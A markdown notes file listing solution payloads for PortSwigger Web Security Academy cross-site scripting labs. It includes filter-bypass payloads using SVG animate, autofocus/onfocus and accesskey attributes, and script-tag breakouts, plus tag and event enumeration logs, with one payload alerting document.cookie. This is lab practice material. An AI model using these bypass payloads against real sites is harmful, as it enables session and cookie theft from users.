# XSS Labs

## Stored XSS into HTML context with nothing encoded

* Payload
```html
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 
```

## Reflected XSS into HTML context with all tags blocked except custom ones
* Payload
```html
<script>location = 'https://ac081f4d1fda91bec1dd414e00810097.web-security-academy.net/?search=%3Cbigb0ss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script> 
```

## Reflected XSS with event handlers and href attributes blocked

* Allowed tags
```
[INFO] Allowed tag: a
[INFO] Allowed tag: text
[INFO] Allowed tag: animate
[INFO] Allowed tag: image
[INFO] Allowed tag: svg
[INFO] Allowed tag: title
```

* Payload
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text></a>
```

## Reflected XSS with some SVG markup allowed

* Allowed tags
```
[INFO] Allowed event: text
[INFO] Allowed event: animatetransform
[INFO] Allowed event: image
[INFO] Allowed event: svg
[INFO] Allowed event: title
```

* Allowed events
```
[INFO] Allowed event: onbegin
```

* Payload
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

## Reflected XSS into attribute with angle brackets HTML-encoded

* Payload
```html
" autofocus onfocus=alert(1) x="
```

## Stored XSS into anchor href attribute with double quotes HTML-encoded

* Payload (solution)
```html
xss_stored_href_attribute.py
```

## Reflected XSS in canonical link tag

* Payload
```html
/'accesskey='X'onclick='alert(1)

# press ALT + CTL + X to initiate the canonical link tag
```

## Reflected XSS into a JavaScript string with single quote and backslash escaped

* Payload
```html
# Terminating the existing JS with </script> and introducing an XSS payload

</script><img src=1 onerror=alert(1)>
```

